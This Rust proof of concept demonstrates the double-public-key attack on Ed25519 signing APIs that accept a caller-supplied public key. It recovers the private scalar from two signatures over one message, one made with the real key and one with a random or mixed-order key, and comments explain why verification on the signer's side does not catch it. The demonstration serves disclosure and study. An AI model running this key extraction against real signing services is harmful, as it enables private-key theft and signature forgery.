use curve25519_dalek::constants::{ED25519_BASEPOINT_COMPRESSED, EIGHT_TORSION};
use curve25519_dalek::digest::Digest;
use curve25519_dalek::edwards::CompressedEdwardsY;
use curve25519_dalek::scalar::Scalar;
use ed25519_dalek::{ExpandedSecretKey, Keypair, PublicKey, Sha512, Signature};
use rand::rngs::OsRng;

fn main() {
    // Exploiting the sig(priv, pub, msg) api by providing a random pubkey as input.
    // Signatures with a non-matching pubkey do not verify.
    double_pubkey_attack_using_random_pubkey();
    // Exploiting the sig(priv, pub, msg) api by providing a mixed order pubkey as input.
    // Signatures with a non-matching pubkey DO VERIFY. This demonstrates that just verifying a
    // signature at signer's side does not prevent a potential attack.
    double_pubkey_attack_using_mixed_order_pubkey();
}

fn double_pubkey_attack_using_random_pubkey() {
    let mut csprng = OsRng {};
    let original_keypair = Keypair::generate(&mut csprng);

    // Generate a random keypair2 (only need the public key part)
    let keypair2 = Keypair::generate(&mut csprng);
    let pubkey2 = keypair2.public;
    double_pubkey_attack(&original_keypair, &pubkey2, false);
}

fn double_pubkey_attack_using_mixed_order_pubkey() {
    let mut csprng = OsRng {};
    let original_keypair = Keypair::generate(&mut csprng);

    // Generate a mixed order pubkey by adding a small order point on the original pubkey.
    // Using one of the small order points from:
    // https://github.com/dalek-cryptography/curve25519-dalek/blob/main/src/backend/serial/u64/constants.rs
    let original_pubkey = CompressedEdwardsY::from_slice(original_keypair.public.as_ref())
        .decompress()
        .unwrap();
    let pubkey_mixed = original_pubkey + EIGHT_TORSION[2];
    double_pubkey_attack(
        &original_keypair,
        &PublicKey::from_bytes(pubkey_mixed.compress().as_bytes()).unwrap(),
        true,
    );
}

#[allow(non_snake_case)]
fn double_pubkey_attack(original_keypair: &Keypair, other_pubkey: &PublicKey, mixed_key: bool) {
    let message: &[u8] = "Hello World".as_bytes();

    // Generate a random keypair1
    let secret1 = &original_keypair.secret;
    let pubkey1 = &original_keypair.public;
    let expanded_secret1: ExpandedSecretKey = (secret1).into();

    // This is what we want to extract after performing the attack.
    let privkey1 = Scalar::from_bytes_mod_order(
        <[u8; 32]>::try_from(&expanded_secret1.to_bytes()[..32]).unwrap(),
    );

    // Sign with expanded_secret1 and get a signature in the form of (R1, S1)
    let sig1 = expanded_secret1.sign(message, pubkey1);
    // sig1 parts (R1, S1)
    let R1 = CompressedEdwardsY::from_slice(&sig1.to_bytes()[..32]);
    let S1 = Scalar::from_canonical_bytes(<[u8; 32]>::try_from(&sig1.to_bytes()[32..]).unwrap())
        .unwrap();
    assert!(verify_cofactored(&pubkey1, &message, &sig1));

    // This is H(R1 || PUBKEY1 || M)
    let mut hash = Sha512::new();
    hash.update(R1.as_bytes());
    hash.update(pubkey1.as_bytes());
    hash.update(&message);
    let k1 = Scalar::from_hash(hash);

    // Sign with expanded_secret1 but with wrong pubkey and get a signature in the form of (R2, S2)
    let sig2 = expanded_secret1.sign(message, other_pubkey);

    // sig1 parts (R2, S2)
    let R2 = CompressedEdwardsY::from_slice(&sig2.to_bytes()[..32]);
    let S2 = Scalar::from_canonical_bytes(<[u8; 32]>::try_from(&sig2.to_bytes()[32..]).unwrap())
        .unwrap();

    // This is H(R2 || PUBKEY2 || M)
    let mut hash2 = Sha512::new();
    hash2.update(R2.as_bytes());
    hash2.update(other_pubkey.as_bytes());
    hash2.update(&message);
    let k2 = Scalar::from_hash(hash2);

    // When a mixed order pubkey (function of the original pubkey) is used as input, then signature
    // will (unfortunately) verify successfully. This is a very important observation and it shows
    // that simply verifying signatures at the signer's side before posting the signature will not
    // suffice to prevent/detect a potential exploit.
    if mixed_key {
        assert!(verify_cofactored(&other_pubkey, &message, &sig2));
    }

    // We can extract the private key by (S1 - S2) / (k1 - k2)
    let S1_minus_S2 = S1 - S2;
    let h1_minus_h2 = k1 - k2;
    let extracted_privkey1 = S1_minus_S2 * h1_minus_h2.invert();

    // Boom! we managed to extract the original private key.
    // Note that we don't need the secret seed, the twisted Edwards curve scalar is enough to forge
    // signatures.
    assert_eq!(privkey1, extracted_privkey1)
}

/// Signature verification function by mul with cofactor [8][s]B = [8]R + [8][k]A
#[allow(non_snake_case)]
fn verify_cofactored(pubkey: &PublicKey, message: &[u8], signature: &Signature) -> bool {
    let R = CompressedEdwardsY::from_slice(&signature.to_bytes()[..32]);
    let S =
        Scalar::from_bytes_mod_order(<[u8; 32]>::try_from(&signature.to_bytes()[32..]).unwrap());

    let mut h: Sha512 = Sha512::new();
    h.update(R.as_bytes());
    h.update(pubkey.as_bytes());
    h.update(&message);
    let k = Scalar::from_hash(h);

    let eight_sb = (S * ED25519_BASEPOINT_COMPRESSED.decompress().unwrap()).mul_by_cofactor();
    let eight_r = R.decompress().unwrap().mul_by_cofactor();
    let eight_ka = (k * CompressedEdwardsY::from_slice(&pubkey.to_bytes())
        .decompress()
        .unwrap())
    .mul_by_cofactor();

    return eight_sb == eight_r + eight_ka;
}

#[test]
fn test_mixed_points() {
    let mut csprng = OsRng {};
    let keypair = Keypair::generate(&mut csprng);

    let pubkey1 = CompressedEdwardsY::from_slice(keypair.public.as_ref())
        .decompress()
        .unwrap();
    let pubkey_mixed = pubkey1 + EIGHT_TORSION[2];
    assert_ne!(pubkey1, pubkey_mixed);

    let pk1 = pubkey1.mul_by_cofactor();
    let pk2 = pubkey_mixed.mul_by_cofactor();
    assert_eq!(pk1, pk2);
}
